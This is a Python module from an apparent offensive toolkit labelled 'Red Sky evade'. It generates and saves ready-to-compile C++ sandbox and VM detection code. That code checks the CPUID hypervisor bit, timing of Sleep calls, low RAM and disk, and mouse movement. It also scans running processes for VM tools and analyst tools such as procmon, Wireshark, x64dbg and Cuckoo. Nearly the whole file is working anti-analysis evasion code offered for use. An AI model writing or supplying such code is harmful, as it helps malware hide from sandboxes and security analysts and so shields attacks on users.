# language: Python, file: Program/evade/sandbox.py, target: Red Sky evade — sandbox detection
# Generate sandbox / VM detection C++ code.

import sys
from pathlib import Path
from typing import List

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import load_config, print_ok, print_err, print_info, print_warn, print_kv, print_bullet
from Program.utils.paths import OUTPUT_DIR


CPP_SANDBOX = r'''// language: C++, target: sandbox / VM detection
// Multiple checks — CPUID hypervisor bit, timing delta, hardware signature,
// process list artifacts. Returns true if a sandbox is suspected.

#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <string.h>

// ── CPUID hypervisor bit ──
static bool CpuidHypervisor() {
    int regs[4] = {0};
    __cpuid(regs, 1);
    return (regs[2] & (1 << 31)) != 0;   // ECX bit 31 = hypervisor present
}

// ── timing delta — sandboxes often accelerate Sleep() ──
static bool TimingDelta() {
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    Sleep(500);
    QueryPerformanceCounter(&t1);
    double elapsed_ms = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / freq.QuadPart;
    return elapsed_ms < 480.0;   // sleep returned too early → sandbox
}

// ── hardware signature — low RAM, low disk, single CPU ──
static bool WeakHardware() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;  // <2GB

    ULARGE_INTEGER freeBytes, totalBytes;
    if (GetDiskFreeSpaceExW(L"C:\\", &freeBytes, &totalBytes, nullptr)) {
        if (totalBytes.QuadPart < 50ULL * 1024 * 1024 * 1024) return true;  // <50GB
    }
    return false;
}

// ── process artifacts ──
static bool SandboxProcesses() {
    static const wchar_t* suspects[] = {
        L"vboxservice.exe", L"vboxtray.exe",
        L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
        L"VBoxService.exe", L"VBoxTray.exe",
        L"qemu-ga.exe", L"qga.exe",
        L"sandboxiedcomlaunch.exe",
        L"procmon.exe", L"procmon64.exe", L"wireshark.exe",
        L"fiddler.exe", L"x64dbg.exe", L"ollydbg.exe", L"idaq.exe", L"idaq64.exe",
        L"windbg.exe", L"immunitydebugger.exe",
        L"cuckoomon.dll",
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            for (auto s : suspects) {
                if (_wcsicmp(pe.szExeFile, s) == 0) {
                    CloseHandle(snap);
                    return true;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return false;
}

// ── mouse movement check ──
static bool NoMouseMovement() {
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(2000);
    GetCursorPos(&p2);
    return (p1.x == p2.x && p1.y == p2.y);
}

// ── aggregate ──
static bool IsSandbox() {
    if (CpuidHypervisor())     return true;
    if (TimingDelta())         return true;
    if (WeakHardware())        return true;
    if (SandboxProcesses())    return true;
    if (NoMouseMovement())     return true;
    return false;
}
'''


def cmd_show(out_file: str = "") -> int:
    print_info("sandbox / VM detection code")
    print()
    print(CPP_SANDBOX)
    out = Path(out_file) if out_file else OUTPUT_DIR / "evade" / "sandbox.cpp"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(CPP_SANDBOX)
    print()
    print_kv("saved", out)
    return 0


def run_cli(args: List[str]) -> int:
    if args and args[0] == "show":
        return cmd_show(args[1] if len(args) > 1 else "")
    return cmd_show()


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
